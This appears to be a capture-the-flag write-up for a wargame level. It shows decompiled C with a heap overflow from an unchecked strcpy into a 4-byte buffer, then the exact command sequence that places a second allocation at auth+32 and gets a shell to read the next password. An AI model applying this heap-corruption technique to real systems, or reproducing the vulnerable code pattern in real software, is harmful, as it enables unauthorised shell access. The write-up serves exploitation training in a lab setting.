This level has a long codebase, if we have to retain the essential lines, here they are:

```c
auth = malloc(4);

if (uVar6 < 0x1f) {                            //0x1f = 31
    strcpy(auth,local_8b);                     //overflow is possible
}

service = strdup(acStack_89);

if (*(int *)(auth + 0x20) == 0) {               //0x20 = 32, the condition checks at auth + 32 bytes
    fwrite("Password:\n",1,10,stdout);
}
else {
    system("/bin/sh");
}
```

When executing the binary, it asks for an user input, and will display this:

```
printf("%p, %p \n",auth,service);
```

There are 4 commands possible:
- auth
- service
- login
- reset

Thus, we can get the flag if we manage to corrupt memory to make the condition if (*(int *)(auth + 0x20) == 0) false.

```sh
./level8
(nil), (nil) 
auth WTF
0x804a008, (nil) 
service WTFFFFFFFFFFFFFF
0x804a008, 0x804a018 
login
```

We are now in a shell, we can display the content of the next level's password.